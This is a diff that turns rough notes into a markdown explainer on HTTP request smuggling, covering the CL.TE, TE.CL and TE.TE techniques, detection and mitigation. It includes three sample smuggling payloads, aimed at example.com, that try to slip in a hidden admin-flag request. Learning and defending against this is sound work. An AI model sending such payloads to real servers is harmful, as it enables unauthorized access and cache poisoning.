@@ -1,31 +1,255 @@
-What iis http request smuggling 
-what it involves: CL and TE
 
-Also refered as HTTP desync or request splitting
+# 🌐 HTTP Request Smuggling
 
- it's crucial to consider the presence of carriage return `\r` and newline `\n` characters. These characters are not only part of the HTTP protocol's formatting but also impact the calculation of content sizes.
+## 📌 What Is It?
 
+**HTTP Request Smuggling (HRS)** is a vulnerability that arises when different components in a web infrastructure (load balancers, proxies, front-end servers, back-end servers) **interpret HTTP request boundaries inconsistently**.
 
-Compossition of modern web applications
+- It typically involves the **Content-Length (CL)** and **Transfer-Encoding (TE)** headers.
+    
+- By exploiting these mismatches, attackers can **smuggle hidden requests**, manipulate back-end behavior, and poison caches.
+    
 
-- common components
-- Reverse Proxy and Load Balancer 
-- Caching Mechanisms 
+📖 _Analogy:_ Imagine a train station with multiple checkpoints, each using different rules for validating tickets. A traveler can exploit these differences to board without a valid ticket. Similarly, attackers exploit parsing discrepancies between servers.
 
+---
 
-Understanding HTTP Request structure
+## ⚙️ How It Works
 
-CONTENT-LENGH Header 
-Transfer-Encoding Header
+- Relies on **HTTP keep-alive** and **pipelining** (multiple requests over the same TCP connection).
+    
+- Ambiguities arise when:
+    
+    - Both `Content-Length` and `Transfer-Encoding` headers are present.
+        
+    - Servers disagree on which one takes precedence.
+        
+- This desync allows a **smuggled request** to ride inside another.
+    
 
-How HEADERS affect request processing 
+---
 
+## 🧨 Attack Process
 
-CL.TE Req Smuggling
+1. Craft an ambiguous request containing **CL** and/or **TE** headers.
+    
+2. Front-end server interprets it differently from the back-end server.
+    
+3. The **back-end executes unintended smuggled request**.
+    
 
-Transfer-Encoding Obfuscation
+💡 **Impact**:
 
+- Cache poisoning (deliver malicious content to users).
+    
+- Hijacking other users’ requests/responses.
+    
+- Unauthorized access (e.g., bypassing auth with hidden requests).
+    
+- Denial of Service (back-end desync).
+    
 
+---
 
-Walkthrough 
+## 🔬 Key Headers
 
+### 📏 Content-Length
+
+Specifies body size in bytes.
+
+```http
+POST /submit HTTP/1.1
+Host: good.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 14
+
+q=smuggledData
+```
+
+### 📦 Transfer-Encoding
+
+Defines how body is encoded (often `chunked`).
+
+```http
+POST /submit HTTP/1.1
+Host: good.com
+Transfer-Encoding: chunked
+
+b
+q=smuggledData
+0
+```
+
+---
+
+## 🧪 Core Techniques
+
+### 1️⃣ CL.TE (Content-Length → Transfer-Encoding)
+
+- **Front-end uses Content-Length**
+    
+- **Back-end uses Transfer-Encoding**
+    
+
+📌 **Payload**
+
+```http
+POST /search HTTP/1.1
+Host: example.com
+Content-Length: 130
+Transfer-Encoding: chunked
+
+0
+
+POST /update HTTP/1.1
+Host: example.com
+Content-Length: 13
+Content-Type: application/x-www-form-urlencoded
+
+isadmin=true
+```
+
+💥 Result:
+
+- Front-end sees request ending at CL (130 bytes).
+    
+- Back-end treats `0` as end of chunk → interprets `POST /update` as a **new request**.
+    
+
+---
+
+### 2️⃣ TE.CL (Transfer-Encoding → Content-Length)
+
+- **Front-end uses Transfer-Encoding**
+    
+- **Back-end uses Content-Length**
+    
+
+📌 **Payload**
+
+```http
+POST / HTTP/1.1
+Host: example.com
+Content-Length: 4
+Transfer-Encoding: chunked
+
+78
+POST /update HTTP/1.1
+Host: example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+
+isadmin=true
+0
+```
+
+💥 Result:
+
+- Front-end consumes entire body as chunked until `0`.
+    
+- Back-end only reads 4 bytes (CL=4).
+    
+- Remainder (`POST /update`) treated as **smuggled request**.
+    
+
+---
+
+### 3️⃣ TE.TE (Transfer-Encoding Obfuscation)
+
+- **Both front-end & back-end use TE**.
+    
+- Exploits **malformed or duplicate TE headers**.
+    
+
+📌 **Payload**
+
+```http
+POST / HTTP/1.1
+Host: example.com
+Content-length: 4
+Transfer-Encoding: chunked
+Transfer-Encoding: chunked1
+
+4e
+POST /update HTTP/1.1
+Host: example.com
+Content-length: 15
+
+isadmin=true
+0
+```
+
+💥 Result:
+
+- Front-end ignores malformed TE (`chunked1`) and uses chunked normally.
+    
+- Back-end interprets differently (or falls back to CL).
+    
+- Smuggled request (`POST /update`) is executed.
+    
+
+---
+
+## 🧠 Why It Works
+
+- **Spec Ambiguity:** HTTP/1.1 allows both `Content-Length` and `Transfer-Encoding`, but behavior isn’t consistent across implementations.
+    
+- **Proxy/Server Mismatch:** Different components prioritize headers differently.
+    
+- **Parsing errors:** Malformed headers can trigger unexpected fallback behaviors.
+    
+
+---
+
+## 🕵️ Detection & Testing
+
+- Look for parameters that allow injecting custom headers.
+    
+- Send requests with **CL & TE** both present.
+    
+- Observe:
+    
+    - Desync between front-end and back-end responses.
+        
+    - Cache anomalies (unexpected content served).
+        
+    - Unexplained errors or broken requests.
+        
+
+⚠️ _Warning:_ Testing can break sites (cache poisoning, failed requests, DoS). Always test in controlled environments.
+
+---
+
+## 🛡️ Mitigation
+
+- Follow **RFC 7230** strictly:
+    
+    - If both CL & TE are present → reject request.
+        
+- Normalize header parsing across all components.
+    
+- Update and patch load balancers, proxies, and web servers.
+    
+- Use **WAFs** with smuggling protections.
+    
+- Disable or carefully handle `Transfer-Encoding: chunked` where not required.
+    
+- Log anomalies (mismatched request boundaries).
+    
+
+---
+
+## 🔍 Key Takeaways
+
+- HRS = exploiting **inconsistent parsing** between servers.
+    
+- Three core techniques: **CL.TE, TE.CL, TE.TE**.
+    
+- Impacts: **cache poisoning, desync attacks, privilege escalation, DoS**.
+    
+- Requires **careful testing** → high risk of collateral impact.
+    
+- Mitigation: **consistent parsing, rejecting ambiguous headers, patching infrastructure**.
+    
+
+---
